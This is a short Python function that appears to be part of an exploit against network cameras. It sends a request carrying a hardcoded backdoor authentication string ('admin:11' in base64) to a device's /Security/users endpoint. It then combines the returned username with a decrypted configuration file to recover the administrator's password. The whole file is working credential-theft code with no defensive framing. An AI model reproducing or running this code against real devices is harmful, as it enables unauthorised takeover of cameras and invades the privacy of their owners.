import requests
import re

def get_user_pass(ip,decrypted_config) : 
    r = requests.get(f'http://{ip}/Security/users?auth=YWRtaW46MTEK')
    username = re.findall(r'<userName>(.*?)</userName>',r.text)[-1]
    user_id = re.findall(r'<id>(.*?)<\/id>',r.text)[-1]   
    pass_list = []
    for i in range(0,len(decrypted_config)) : 
        if decrypted_config[i] == username :
            pass_list.append(decrypted_config[i+1])
    password = pass_list[-1]
    return [username,password,user_id]

